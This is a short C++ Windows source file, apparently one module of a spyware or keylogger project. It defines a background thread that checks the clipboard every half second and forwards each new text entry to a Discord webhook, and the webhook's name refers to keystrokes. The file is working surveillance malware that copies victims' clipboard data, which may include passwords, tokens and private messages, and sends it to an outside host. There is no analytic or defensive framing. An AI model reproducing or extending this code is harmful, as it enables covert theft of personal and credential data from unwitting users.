#include "clipboard.h"
#include "discord.h"
#include "config.h"
#include <windows.h>
#include <string>
#include <thread>
#include <chrono>

void HiloClipboard() {
    std::wstring ultimo;

    while (true) {
        std::this_thread::sleep_for(std::chrono::milliseconds(500));

        if (!OpenClipboard(NULL)) continue;

        HANDLE hData = GetClipboardData(CF_UNICODETEXT);
        if (hData) {
            wchar_t* texto = (wchar_t*)GlobalLock(hData);
            if (texto) {
                std::wstring actual(texto);
                GlobalUnlock(hData);

                if (actual != ultimo && !actual.empty() && actual.size() < 1000) {
                    ultimo = actual;

                    std::wstring msg = L"📋 **Portapapeles:**\n```" + actual + L"```";
                    DiscordEnviarTexto(WEBHOOK_TECLAS, msg);
                }
            }
        }
        CloseClipboard();
    }
}